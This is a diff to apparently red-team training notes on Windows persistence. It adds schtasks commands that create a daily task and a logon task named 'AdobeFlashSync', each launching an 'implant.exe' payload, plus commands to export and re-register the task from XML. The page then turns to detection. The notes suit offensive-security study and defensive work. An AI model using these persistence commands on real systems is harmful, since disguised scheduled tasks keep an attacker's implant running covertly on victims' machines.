@@ -4,8 +4,24 @@
 
 run the following command to generate a new task called MyTask that is scheduled to run daily at 9:00am that will execute the empire.exe binary located in the C:\ root folder.
 
+#### <mark style="color:green;">as a regular USER:</mark>
+
 ```
-schtasks /create /tn “MyTask” /sc daily /st 09:00 /tr “C:\empire.exe”
+schtasks /create /tn "Mytasks\go" /sc daily /st 09:00 /tr "c:\rto\pers\implant\implant.exe"
+schtasks /query /tn "mytasks\go" /fo:list /v
+schtasks /run /tn "mytasks\go"
+```
+
+#### <mark style="color:green;">as a LOCAL ADMIN:</mark>
+
+```
+schtasks /create /sc onlogon /tn AdobeFlashSync /tr "c:\rto\pers\implant\implant.exe"
+schtasks /query /tn "AdobeFlashSync" /fo list
+
+schtasks /query /tn AdobeFlashSync /xml 
+schtasks /query /tn AdobeFlashSync /xml > c:\RTO\PERS\tsk.xml
+schtasks /delete /f /tn AdobeFlashSync
+schtasks /create /tn AdobeFlashSync /xml c:\RTO\PERS\tsk.xml
 ```
 
 ## <mark style="color:red;">Detection</mark>
